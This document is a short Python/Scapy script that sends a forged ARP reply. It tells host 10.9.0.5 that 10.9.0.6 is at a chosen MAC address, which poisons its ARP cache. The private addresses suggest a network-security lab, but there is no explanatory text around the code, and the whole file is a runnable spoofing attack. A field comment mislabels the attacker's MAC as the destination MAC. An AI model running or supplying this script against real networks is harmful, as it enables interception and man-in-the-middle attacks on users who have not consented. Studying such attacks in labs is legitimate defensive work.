from scapy.all import *

target_ip = "10.9.0.5"
spoofed_ip = "10.9.0.6"
attacker_mac = "02:42:0a:09:00:69"

Epkt = Ether(dst="02:42:0a:09:00:05")
Arppkt = ARP(
	op=2, 		# 2 for ARP response
	psrc=spoofed_ip, 	# source ip 
	pdst=target_ip, 	# dst ip
	hwdst=attacker_mac,	# dst MAC
)

pkt= Epkt/Arppkt
sendp(pkt, iface="eth0")
print(f"Sent ARP response for {target_ip} using ip address {spoofed_ip} and MAC address {attacker_mac}")
